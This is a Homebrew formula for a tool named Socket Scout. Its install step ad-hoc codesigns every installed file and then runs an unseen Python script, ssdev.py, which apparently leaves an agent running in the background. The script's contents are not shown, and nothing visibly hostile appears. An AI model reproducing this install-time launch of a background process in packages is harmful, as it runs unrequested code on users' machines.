class SocketScout < Formula
  desc "Installation of Socket Scout"
  homepage "https://github.com/socket-sec/homebrew-socket-scout"
  url "https://github.com/socket-sec/homebrew-socket-scout/archive/refs/tags/v.2.1.0.tar.gz"
  version "2.1.0"
  sha256 "9406085c266892bb74c60262d9bed7b6d0b1e325b8cb831daee4c1a5f966d590"
  license "MIT"

   def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "python3 #{bin}/ssdev.py"
      end

    def caveats
        <<~EOS
        The Socket Agent is now running in the background, thank you!
        EOS
    end
    end
